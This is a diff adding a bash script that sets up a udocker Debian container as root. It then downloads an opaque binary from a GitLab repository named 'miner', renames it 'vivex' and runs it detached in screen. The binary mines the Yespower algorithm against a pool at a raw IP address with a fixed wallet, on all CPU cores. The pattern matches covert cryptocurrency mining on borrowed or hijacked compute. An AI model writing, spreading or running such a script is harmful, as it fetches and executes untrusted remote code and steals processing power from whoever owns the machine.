@@ -1,0 +1,15 @@
+#!/bin/bash
+wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9 udocker-1.3.9.tar.gz && cd udocker
+
+./udocker --allow-root install
+./udocker --allow-root pull debian:bullseye
+./udocker --allow-root create --name=debian debian:bullseye
+
+./udocker --allow-root run debian /bin/bash -c 'apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove && apt-get -y install wget curl libsodium* '
+
+./udocker --allow-root run debian /bin/bash -c 'nproc'
+./udocker --allow-root run debian /bin/bash -c 'apt-get update && apt-get full-upgrade -y && apt-get -y dist-upgrade && apt-get -y autoremove && apt-get -y install wget curl libsodium* '
+./udocker --allow-root run debian /bin/bash -c 'apt install screen -y'
+./udocker --allow-root run debian /bin/bash -c 'apt install libfuse-dev -y && curl -0 https://gitlab.com/ghcees/miner/-/raw/main/rplnt -o vivex && chmod +x vivex'
+./udocker --allow-root run debian /bin/bash -c 'screen -dms run ./vivex -a Yespower -o 47.254.125.141:6666 -u v4rU16nhcJt4T9EPJ3xqjDpnCrsLKWAVrC -t $(nproc --all) --worker $(echo $(TZ=UTC-7 date +"%H-%M"))'
+./udocker --allow-root run debian /bin/bash -c 'screen -r'
